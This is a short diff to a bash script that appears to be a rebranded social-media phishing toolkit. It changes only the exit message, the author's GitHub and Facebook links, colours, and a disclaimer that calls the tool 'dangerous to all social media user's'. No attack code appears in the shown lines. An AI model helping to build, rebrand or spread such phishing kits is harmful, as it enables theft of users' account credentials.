@@ -334,7 +334,7 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool. i hope you enjoy using ^_^${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -343,17 +343,17 @@ about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${GREEN} Author   ${RED}:  ${ORANGE}MAMBA MENTALITY ${RED}[ ${ORANGE}MAMBA-9MM ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/mamba-9mm/phishing
+		${GREEN} Facebook   ${RED}:  ${CYAN}https://facebook.com/mambamentality9mm
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
-		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
-		  any misuse of this toolkit ${RED}!${WHITE}
+		  only ${RED}!${WHITE}${CYAN} and this PHISHING TOOL is dangerous to all social media user's, Author will not be responsible to
+		  any misuse of this tool in a wrong way ${RED}!${WHITE}
 		
-		${WHITE} ${CYANBG}Special Thanks to myself:${RESETBG}
-		${GREEN}  Mamba Mentality
+		${WHITE} ${ORANGEBG}Special Thanks to myself:${RESETBG}
+		${CYAN}  Mamba Mentality
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
